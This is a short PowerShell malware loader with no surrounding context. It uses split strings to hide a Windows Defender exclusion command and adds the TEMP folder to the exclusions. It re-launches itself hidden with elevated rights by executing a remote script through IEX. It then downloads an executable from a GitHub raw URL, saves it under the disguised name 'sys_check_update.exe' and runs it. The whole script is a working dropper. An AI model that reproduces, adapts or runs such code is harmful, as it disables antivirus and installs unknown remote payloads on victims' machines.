$d = 'Add-Mp' + 'Preference'; $p = '-Exclusion' + 'Path'
$t = $env:TEMP + '\sys_check_update.exe'
$u = 'https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe'

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoP -Exec Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/winstarchik/FFF/main/loader.ps1')" -Verb RunAs
    exit
}

try { Invoke-Expression "$d $p '$env:TEMP'" } catch {}

(New-Object System.Net.WebClient).DownloadFile($u, $t)
if (Test-Path $t) { Start-Process $t }
